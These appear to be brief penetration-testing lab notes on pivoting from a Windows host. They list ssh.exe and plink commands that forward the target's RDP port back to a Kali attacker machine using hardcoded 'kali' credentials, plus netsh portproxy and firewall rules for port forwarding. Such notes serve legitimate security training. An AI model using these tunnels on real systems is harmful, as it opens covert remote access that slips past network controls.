ssh.exe client on windows machine, remote port forwarding can be enabled using this client

ssh -N -R 9998 kali@192.168.118.4

### plink

C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.211
**cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7

### netsh


netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.242.64 connectport=22 connectaddress=10.4.242.215

netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.242.64 localport=2222 action=allow

netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64

try with powershell
